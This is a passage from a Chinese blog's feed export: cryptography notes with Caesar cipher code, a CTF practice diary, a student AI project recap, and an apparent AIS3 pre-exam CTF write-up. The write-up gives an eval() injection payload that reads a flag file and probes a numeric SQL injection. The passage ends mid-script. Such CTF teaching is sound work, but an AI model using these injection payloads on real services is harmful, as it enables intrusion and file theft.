雜湊計算</span></span><br><span class="line">message = <span class="string">&quot;This is SHA-256!&quot;</span></span><br><span class="line">hash_result = sha256(message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;SHA-256 Value: <span class="subst">&#123;hash_result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="鹽-Salt"><a href="#鹽-Salt" class="headerlink" title="鹽 Salt"></a>鹽 Salt</h2><p>TODO</p><h1 id="古典密碼學-Classical-Cryptography"><a href="#古典密碼學-Classical-Cryptography" class="headerlink" title="古典密碼學 Classical Cryptography"></a>古典密碼學 Classical Cryptography</h1><p>古典密碼是指在計算機出現之前廣泛使用的密碼學技術。這些密碼技術通常基於簡單的替換或置換規則，而不涉及覆雜的數學運算。</p><p>儘管這些古典密碼在過去被廣泛使用，但它們都存在易受攻擊的缺陷，因此在現代密碼學中已經不再安全。現代密碼學使用基於覆雜數學運算和密鑰管理的加密算法來確保更高的安全性（且在現代密碼學中的觀點，他們更像是<strong>編碼</strong>而不是加密）。</p><p>以下是幾種常見的古典密碼。</p><h2 id="凱薩加密-Caesar-Cipher"><a href="#凱薩加密-Caesar-Cipher" class="headerlink" title="凱薩加密 Caesar Cipher"></a>凱薩加密 Caesar Cipher</h2><h3 id="簡介-5"><a href="#簡介-5" class="headerlink" title="簡介"></a>簡介</h3><p>凱撒密碼是一種簡單的替換密碼（Substitution cipher），通過將字母表中的每個字母向後（或向前）移動固定數量的位置來加密文本。例如，如果向後移動 3 個位置，則”A”加密為”D”，”B”加密為”E”，以此類推。</p><h3 id="Python-Code-5"><a href="#Python-Code-5" class="headerlink" title="Python Code"></a>Python Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_encrypt</span>(<span class="params">plaintext, key</span>):</span><br><span class="line">    ciphertext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> plaintext:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():  <span class="comment"># 只對字母進行加密</span></span><br><span class="line">            shift = (</span><br><span class="line">                <span class="number">65</span> <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="number">97</span></span><br><span class="line">            )  <span class="comment"># 大寫字母對應 ASCII 表中的 65，小寫字母對應 97</span></span><br><span class="line">            encrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - shift + key) % <span class="number">26</span> + shift)</span><br><span class="line">            ciphertext += encrypted_char</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ciphertext += char  <span class="comment"># 非字母字符保持不變</span></span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    <span class="keyword">return</span> caesar_encrypt(ciphertext, -key)  <span class="comment"># 解密即加密的逆操作</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例明文和密鑰</span></span><br><span class="line">plaintext = <span class="string">&quot;This is the Caesar cipher&quot;</span></span><br><span class="line">key = <span class="number">14</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密明文</span></span><br><span class="line">encrypted_text = caesar_encrypt(plaintext, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted:&quot;</span>, encrypted_text)</span><br></pre></td></tr></table></figure><h3 id="暴力破解-Brute-Force"><a href="#暴力破解-Brute-Force" class="headerlink" title="暴力破解 Brute Force"></a>暴力破解 Brute Force</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 嘗試所有可能的密鑰進行破解</span></span><br><span class="line"><span class="keyword">for</span> possible_key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):  <span class="comment"># 因為凱撒密碼只有 26 種可能的密鑰</span></span><br><span class="line">    decrypted_text = caesar_decrypt(encrypted_text, possible_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Key <span class="subst">&#123;possible_key&#125;</span>: <span class="subst">&#123;decrypted_text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="置換密碼-Transposition-Cipher"><a href="#置換密碼-Transposition-Cipher" class="headerlink" title="置換密碼 Transposition Cipher"></a>置換密碼 Transposition Cipher</h2><h3 id="簡介-6"><a href="#簡介-6" class="headerlink" title="簡介"></a>簡介</h3><p>置換密碼重新排列明文中的字母，而不改變字母本身。例如，列置換密碼將明文中的字母按列排列，然後按特定規則讀取以生成密文。</p><h2 id="維吉尼亞密碼-Vigenere-Cipher"><a href="#維吉尼亞密碼-Vigenere-Cipher" class="headerlink" title="維吉尼亞密碼 Vigenère Cipher"></a>維吉尼亞密碼 Vigenère Cipher</h2><h3 id="簡介-7"><a href="#簡介-7" class="headerlink" title="簡介"></a>簡介</h3><p>維吉尼亞密碼是一種多表替換密碼，它使用關鍵字來改變每個字母的替換規則。加密時，將明文的每個字母與關鍵字中的對應字母相結合來確定替換規則。</p><h2 id="柵欄密碼-Rail-Fence-Cipher"><a href="#柵欄密碼-Rail-Fence-Cipher" class="headerlink" title="柵欄密碼 Rail Fence Cipher"></a>柵欄密碼 Rail Fence Cipher</h2><h3 id="簡介-8"><a href="#簡介-8" class="headerlink" title="簡介"></a>簡介</h3><p>柵欄密碼將明文中的字母沿著特定的線排列，然後以不同的方式讀取以生成密文。例如，3 欄柵欄密碼將字母交替排列成三行，然後以從上到下、從左到右的順序讀取。</p><h1 id="對稱式加密-Symmetric-Cryptography"><a href="#對稱式加密-Symmetric-Cryptography" class="headerlink" title="對稱式加密 Symmetric Cryptography"></a>對稱式加密 Symmetric Cryptography</h1><p>TODO</p><h1 id="非對稱式加密-Asymmetric-Cryptography"><a href="#非對稱式加密-Asymmetric-Cryptography" class="headerlink" title="非對稱式加密 Asymmetric Cryptography"></a>非對稱式加密 Asymmetric Cryptography</h1><h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><h3 id="RSA-介紹"><a href="#RSA-介紹" class="headerlink" title="RSA 介紹"></a>RSA 介紹</h3><h3 id="小公鑰指數攻擊（Low-public-exponent-attack）"><a href="#小公鑰指數攻擊（Low-public-exponent-attack）" class="headerlink" title="小公鑰指數攻擊（Low public exponent attack）"></a>小公鑰指數攻擊（Low public exponent attack）</h3><h3 id="Coppersmith’s-Attack"><a href="#Coppersmith’s-Attack" class="headerlink" title="Coppersmith’s Attack"></a>Coppersmith’s Attack</h3><h3 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h3>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> 資安 </tag>
            
            <tag> 密碼學 </tag>
            
            <tag> 筆記 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Day 01] Grinding PicoCTF</title>
      <link href="/2024%20CTF%20Training/Day-01-Grinding-PicoCTF/"/>
      <url>/2024%20CTF%20Training/Day-01-Grinding-PicoCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因為已經有開了一篇文章，打算放上所有 picoCTF 的 writeups 了，所以就不把解題思路寫在這邊啦，如果想看的話請見<a href="/CTF/All-in-One%20PicoCTF-Writeups/">這邊</a>！</p><h1 id="今日進度"><a href="#今日進度" class="headerlink" title="今日進度"></a>今日進度</h1><p>今天打算先刷一點 picoCTF 的題目，因為成大資安社加入戰隊的標準是一萬分，然後我現在才六千多。但是！當我今天開始刷題目之後我發現 pico 他們的制度整個大改！現在沒有計算分數的機制了，改為把題目分成三個不同的難度（像是 Leetcode 那樣），分別是 easy, medium, hard。所以不知道到時候加戰隊的標準會是多少呢，不過以下就是我今天的進度啦！</p><ol><li>More SQLi</li><li>Trickster</li></ol><p>今天進度就兩題，不過感覺多多少少是有學習到新知識的。之後可能要找一天特別來研究一下 sqlmap 的文檔，到時候再出成一篇筆記文章吧！兩題可能聽起來有點少，但畢竟剛放暑假，我還在那個耍廢狀態 XD，慢慢調整啦！</p><h1 id="今日狀態"><a href="#今日狀態" class="headerlink" title="今日狀態"></a>今日狀態</h1><ul><li>起床時間：<code>8:30</code></li><li>知識量：⭐⭐⭐</li><li>疲勞程度：⭐⭐</li><li>精神狀態：⭐⭐⭐⭐⭐</li></ul>]]></content>
      
      
      <categories>
          
          <category> 2024 CTF 修煉計畫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PicoCTF </tag>
            
            <tag> CyberSec </tag>
            
            <tag> 30天計畫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 GDSC NCKU AI Team</title>
      <link href="/DevCorner/2024-GDSC-NCKU-AI-Team/"/>
      <url>/DevCorner/2024-GDSC-NCKU-AI-Team/</url>
      
        <content type="html"><![CDATA[<h1 id="Intro-—-What-is-GDSC"><a href="#Intro-—-What-is-GDSC" class="headerlink" title="Intro — What is GDSC"></a>Intro — What is GDSC</h1><p><a href="https://gdg.tw/about/gdsc/">GDSC</a>(Google Developer Student Clubs)是一個由 Google 支持的學生社群，旨在通過學生與專業開發人員聯繫，促進學生對 Google 開發人員技術的學習和應用，並為學生提供與技術專家互動和學習的機會。 GDSC 在全球有超過 100 個國家&#x2F;地區的 1000 多個社群。GDSC 是學生們學習和分享技術的理想社群，並且能夠與技術行業的其他開發人員和專家建立聯繫。(以上皆是 Ctrl+c &amp; Ctrl+v)</p><p>那我自己在成大待了一年的 GDSC，我認為他是個甚麼東西呢？我會說他就是專案社群+課程+演講的集合。這裡集結了一群很有想法的學生聚在一起開心地做專案，然後在這一年的專案旅程中，每兩個禮拜就會有一次社團課程。有時候是幹部們輪流教學一些開發技巧，讓大家對每個領域的技術都稍有了解；有時候是會邀請業界大佬來和我們分享經驗。</p><p>總之就是一個非常有想法和對技術非常有熱忱的人所組合在一起的團隊，加入 GDSC 一定可以感受到那種英雄惜英雄的感覺！接下來，我們就從面試開始講起，來紀錄一下這一年的旅程吧！</p><h1 id="Interview"><a href="#Interview" class="headerlink" title="Interview"></a>Interview</h1><p>我在大一的時候(2023)加入了成大的 GDSC，當初面試了三個組別，志願序從前面到後面分別是 AI 組、Web 組、Data 組。在面試的時候主要就是會問一些你之前有沒有過相關的經驗或是一些知識性的問題。舉 AI 組的面試來說，當初幹部就有問我甚麼是 P value、我所熟悉的程式語言、然後給我一些題目問我要怎麼去找出兩者之間的相關性（具體問題有點忘記了，畢竟是一年前。但我記得我的回答跟 Linear regression 有關），再來就是可能要清楚 Correlation doesn’t imply causation 等。除了這些比較 Hard skill 的問題，也會問你如果錄取了會如何安排時間以及 GDSC 對你而言的 Priority 等等。現在回頭看也十分可以理解當初為甚麼這麼問，畢竟一整年要和大家一起做專案，中途跑掉肯定是不太好的。</p><p>後來面試完，我順利地加入了第一志願的組別，AI 組。雖然當初對於 AI 的知識沒有甚麼了解，但這剛好給了我一個機會開始展開學習。</p><h1 id="About-my-team"><a href="#About-my-team" class="headerlink" title="About my team"></a>About my team</h1><p>因為這次的 AI 組人有點多，所以我們又有分成了幾個小組。而我分到的這個小組中，我是唯一一個大一生。其他的成員從大三到碩班都有（AI 組也總共兩個大一的&gt;&lt;），總之我就是裡面資歷最淺的那位。但即便如此，也不會感受到被排斥的感覺，大家也不會因為我年紀比他們小而忽視掉我在團隊中的想法（大家真的很友善，很有 Google 那種多元友善包容的感覺 XD）。</p><h1 id="Our-project"><a href="#Our-project" class="headerlink" title="Our project"></a>Our project</h1><p>我們在歷經將近一個學期的討論還有熟悉彼此以及熟悉這個團隊之後（具體來說是在寒假），討論出了我們的專案主題。我們想要透過 AI 模型的分析，讓我們能夠預測股票的價格走向。我們這次訓練模型是採用特斯拉的股票來作為我們的對象，並且我們除了一般的指標外，我們另外加入了推文、新聞和特斯拉財報作為我們的 Indicators。我們的整體流程如下：</p><blockquote><ol><li>針對推特的推文、各大媒體新聞、特斯拉財報這三個不同的文本訓練出不同的 Sentiment analysis model</li><li>訓練一個準備接收上述資料做預測的 LSTM</li><li>利用我們的 SA 模型去 Label 每日的資料，並傳入一個 LSTM</li></ol></blockquote><p>最後我們每天輸入當日的三種文本的 SA 分數到我們的 LSTM 去預測隔日的股票價格，並成功得到出了還蠻精準的結果，更詳細的可以看我們的海報，如下（最下面的圖片中，右下角的指標有誤植。藍色的線為真實股價，橘色的線為我們預測的）：</p><p><img src="https://hackmd.io/_uploads/rJKaUHmIA.png" alt="我們的海報"></p><h1 id="My-role-in-the-team"><a href="#My-role-in-the-team" class="headerlink" title="My role in the team"></a>My role in the team</h1><p>我在我們這組是負責推文的部分。一開始，我是先用 Kaggle 找到的<a href="https://www.kaggle.com/datasets/omermetinn/tweets-about-the-top-companies-from-2015-to-2020/data?select=Company_Tweet.csv">這個資料集</a>以及<a href="https://huggingface.co/cardiffnlp/twitter-roberta-base-sentiment-latest">cardiffnlp&#x2F;twitter-roberta-base-sentiment-latest</a>和<a href="https://huggingface.co/austinmw/distilbert-base-uncased-finetuned-tweets-sentiment">austinmw&#x2F;distilbert-base-uncased-finetuned-tweets-sentiment</a>這兩個 Pre-trained Model 去幫我們的資料做 Label。</p><p>但是後來我們希望可以有更近期的資料，所以我寫了<a href="https://github.com/CX330Blake/X-crawler">這個爬蟲</a>來爬取 2021 到 2024 五月的推文的資料（但因為我沒有買 API，所以只能慢慢用 Selenium 滑）。在蒐集完資料後，我用了那兩個 Model 去做 Label，並且在 Label 完後抓取相同比例的 Positive、Neutral、Negative 的資料去對 BERT 做 Fine-tune，得到<a href="https://huggingface.co/CX330Blake/tweet-sentiment-analysis-for-tesla">最後的 SA 模型</a>。</p><h1 id="NCKU-GDSC-Forum"><a href="#NCKU-GDSC-Forum" class="headerlink" title="NCKU GDSC Forum"></a>NCKU GDSC Forum</h1><p>終於到了成果發表的當天，當天就是有很多的講座以及我們自己擺設的每個小組的攤位。我們要對每位到攤位前的觀眾做講解，跟他們說我們到底做了些甚麼，然後當天的講座也是十分有趣，會很有收穫。我在聽完了前輩們的分享後，更有了想要努力前往矽谷的衝動，有種受到矽谷召喚的感覺 XD。至於更詳細的，就看一下以下的紀錄影片吧！</p><div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/MWK4geiYARs" frameborder="0" allowfullscreen></iframe></div><h1 id="What-I-learned-in-this-year"><a href="#What-I-learned-in-this-year" class="headerlink" title="What I learned in this year"></a>What I learned in this year</h1><p>撇除掉一些 Hard skill（這是一定會學習到的），我比較想來談談加入 GDSC 的一些 Trade-off。加入 GDSC 後，勢必會壓縮到其他的時間，所以要更懂得如何安排自己的休閒娛樂以及讀書的時間。但同時，也確實可以在這裡獲得很多學業之外的東西。比如說拓展自己的人脈、吸取更多前輩的經驗，但我覺得最重要的，是可以找到一群志同道合夥伴們。這一來可以讓自己在自我精進的這條路上更不孤單，其次也可以增加自己對這種開發社群（或是身為「開發者」）的身分認同。</p><p>結論上來說，如果你同時有很多其他的活動，或是想要好好的衝一下 GPA，或許可以慎重考慮一下要不要參加（因為畢竟做專案真的會花不少時間，還要上社課）；但如果你也和我一樣，相信比起分數有更重要的事，那就大膽地來參加吧，一定會收獲不少的！</p><p>最後附上我們今年 GDSC 的口號：</p><blockquote><p>Code your goal, Fuel your soul! — <strong><em>2024 GDSC NCKU</em></strong></p></blockquote><p>如果這篇文章對你有幫助，歡迎<a href="https://cx330.tw/subscribe/">訂閱我的 Blog</a>，會在有新文章的時候通知你，十分感謝！</p>]]></content>
      
      
      <categories>
          
          <category> 開發角 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
            <tag> GDSC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reading List</title>
      <link href="/LifeAndTalk/Reading-List/"/>
      <url>/LifeAndTalk/Reading-List/</url>
      
        <content type="html"><![CDATA[<ol><li><a href="https://johnliutw.medium.com/list/google-4cfac4644843">Google 的軟體工程之道</a></li><li><a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/">Sqlmap 文檔中文版</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> LifeAndTalk </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2024 AIS3 Pre-exam Writeup</title>
      <link href="/CTF/2024-AIS3-Pre-exam-Writeup/"/>
      <url>/CTF/2024-AIS3-Pre-exam-Writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>請容我先自我介紹一下！我今年大一，在高中的時候並不是理工背景的學生，相反，我原本是打算去唸法律系的。但是在高三下的時候意外接觸到了 CTF 的資訊，自己稍微摸索了一下，也學了一點程式設計後發現自己對這個領域更為有興趣。可惜當時已經來不及報名學測的自然科目，我就下定決心要到成大不分系，利用他們的選課權利多修習資工系的課程。最終，我如願進到了成大，也在這將近一年的時間裡，修著和資工系一樣的課程，也更加地堅定了自己的選擇是正確的。</p><p>而進到成大後我也並沒有忘記自己當時的初衷，是因為對資安特別感興趣，才誘使我轉換到了這條跑道，所以我也報名了 SCIST 的課程，希望可以在資安領域有更多的成長。嚴格說起來，加上 SCIST 的期末考試，這次是我第二次正式的資安比賽。而這次的我又比上次(SCIST 期末考)花了更多的時間在解題。這次三天的賽程，我幾乎是除了吃飯睡覺以外的時間，都在解題(三點睡覺八點起床 💤)，可惜最後還是一直卡在一些想不出來的點，所以解出來的題目還是有點少。希望在我今年暑假的修煉過後，下次參賽可以有更好的表現！</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Evil-Calculator"><a href="#Evil-Calculator" class="headerlink" title="Evil Calculator"></a>Evil Calculator</h2><blockquote><p><em>Command Injection</em></p></blockquote><p>先觀察題目，打開 F12 的開發者工具，隨便輸入點東西看看它的運作。這邊我們先在計算機上按下 3+3。</p><p><img src="https://hackmd.io/_uploads/SydoCk94C.png"></p><p>在圖中我們可以看見，他其實是傳了一個 request 給後端服務器，後端服務器會去執行這個計算，並且把結果回傳給前端。這邊的 payload 長這樣:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span> <span class="string">&quot;3+3&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>我們可以發現他就是執行了後面的 3+3。這時候我們再去看題目給的<code>app.py</code>文件，就可以更加地確定我們的想法是對的。如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calculate&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>():</span><br><span class="line">    data = request.json</span><br><span class="line">    expression = data[<span class="string">&quot;expression&quot;</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">eval</span>(expression) <span class="comment"># 這裡就是我們要inject的地方！</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        result = <span class="built_in">str</span>(e)</span><br><span class="line">    <span class="keyword">return</span> jsonify(result=<span class="built_in">str</span>(result))</span><br></pre></td></tr></table></figure><p>所以我們只要把<code>&#123;expression: &quot;3+3&quot;&#125;</code>中的<code>&quot;3+3&quot;</code>替換成我們要注入的命令就可以被執行了。</p><p>我這邊是用 Chrome 的插件 HackBar 去送請求，本來想要直接<code>cat ../flag</code>，但我發現他的源碼中會把空格給取代掉，像這樣</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expression = data[<span class="string">&quot;expression&quot;</span>].replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>所以換了種寫法，payload 如下:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;&#x27;.join([open(&#x27;../flag&#x27;).read()])&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然後我們就得到 flag 了！</p><p><img src="https://hackmd.io/_uploads/S1DlyecE0.png" alt="evil calculator flag"></p><p>(圖片的字可能有點小，flag 我放在下面)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;7RiANG13_5NAK3_I5_50_3Vi1&#125;</span><br></pre></td></tr></table></figure><p>(我在寫 writeup 的時候才想到，原來題目叫做 evil calculator 是因為作者給了個小提示告訴我們源碼中的 eval 函式有問題 😶)</p><h2 id="Ebook-Parser"><a href="#Ebook-Parser" class="headerlink" title="Ebook Parser"></a>Ebook Parser</h2><p>這題我一看到就覺得是文件上傳漏洞(file upload vulnerability)。</p><p><img src="https://hackmd.io/_uploads/HyNVgLoN0.png"></p><p>但是知道是知道，難就難在我不知道 payload 是甚麼以及該怎麼實作 🥲。所以我嘗試了很多種方法，包括在某個 epub 檔案後面注入一些東西，但都還是失敗了。</p><h2 id="It’s-MyGO"><a href="#It’s-MyGO" class="headerlink" title="It’s MyGO!!!!!"></a>It’s MyGO!!!!!</h2><p>這個題目給了個網站，上面有很多甚麼 MyGO 的東西(我不知道這啥但我室友一直很開心??)，然後稍微亂點一下之後會發現沒有甚麼東西，就是三個介面:簡介、成員介紹、原創曲。點到原創曲那邊後會發現網址好像有個 SQLi 的機會，如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chals1.ais3.org:11454/song?id=2</span><br></pre></td></tr></table></figure><p>嘗試過後發現如果把網址改為</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chals1.ais3.org:11454/song?id=5-3</span><br></pre></td></tr></table></figure><p>一樣可以跳出剛剛 song id&#x3D;2 的畫面，所以推測應該是數字型 SQLi。至此，我就沒有想法了…。雖然好像應該要寫出來的，但可惜之前一直沒有好好研究 SQL 語法，所以也不太知道漏洞該用怎麼樣的 payload。(然後後來聽大家在群組說好像可以用 SQLmap，好可惜…暑假一定來好好研究 SQLmap 的文檔～)</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>密碼學真的是一直以來都覺得很難的東西，全部都是數學要理解起來還真的是有點小吃力，希望之後可以多多加油 😶‍🌫️</p><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>這題叫做 babyRSA，但我到最後都還是沒能寫出來 🥲🥲🥲。好的先來看看題目，題目如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_keypair</span>(<span class="params">keysize</span>):</span><br><span class="line">    p = getPrime(keysize)</span><br><span class="line">    q = getPrime(keysize)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    e = random.randrange(<span class="number">1</span>, phi)</span><br><span class="line">    g = gcd(e, phi)</span><br><span class="line">    <span class="keyword">while</span> g != <span class="number">1</span>:</span><br><span class="line">        e = random.randrange(<span class="number">1</span>, phi)</span><br><span class="line">        g = gcd(e, phi)</span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">    <span class="keyword">return</span> ((e, n), (d, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">pk, plaintext</span>):</span><br><span class="line">    key, n = pk  <span class="comment"># pk =(e, n)</span></span><br><span class="line">    cipher = [<span class="built_in">pow</span>(<span class="built_in">ord</span>(char), key, n) <span class="keyword">for</span> char <span class="keyword">in</span> plaintext]</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">pk, ciphertext</span>):</span><br><span class="line">    key, n = pk  <span class="comment"># pk = (d, n)</span></span><br><span class="line">    plain = [<span class="built_in">chr</span>(<span class="built_in">pow</span>(char, key, n)) <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public, private = generate_keypair(<span class="number">512</span>)</span><br><span class="line">encrypted_msg = encrypt(public, flag)</span><br><span class="line">decrypted_msg = decrypt(private, encrypted_msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Public Key:&quot;</span>, public)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted:&quot;</span>, encrypted_msg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decrypted:&quot;</span>, decrypted_msg)</span><br></pre></td></tr></table></figure><p>題目看起來就是個正常的 RSA 加密流程:</p><ol><li>先取得兩個大質數$p$和$q$</li><li>$p$和$q$相乘後得到$n$</li><li>$(p-1)\times(q-1)$得到$\phi(n)$</li><li>再找一個和$\phi(n)$互質的$e$，至此，公鑰已經完成</li><li>再用$e^{-1} \bmod \phi(n)$算出 d，至此，私鑰也已經找到</li></ol><p>然後接下來我來整理一下我這次嘗試過的各種解法。</p><h3 id="暴力因式分解"><a href="#暴力因式分解" class="headerlink" title="暴力因式分解"></a>暴力因式分解</h3><p>我嘗試使用<a href="http://factordb.com/">FactorDB</a>去分解$n$，找到需要的$p$跟$q$，但可惜最後以失敗告終。</p><h3 id="費馬分解-Fermat’s-factorization"><a href="#費馬分解-Fermat’s-factorization" class="headerlink" title="費馬分解(Fermat’s factorization)"></a>費馬分解(Fermat’s factorization)</h3><p>費馬分解是用在當$p$跟$q$相差很小的時候使用的，但因為不知道$p$和$q$所以就還是試試看囉。至於我的腳本就長得像下面這樣:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fermat_factorization</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    a = gmpy2.isqrt(n) + <span 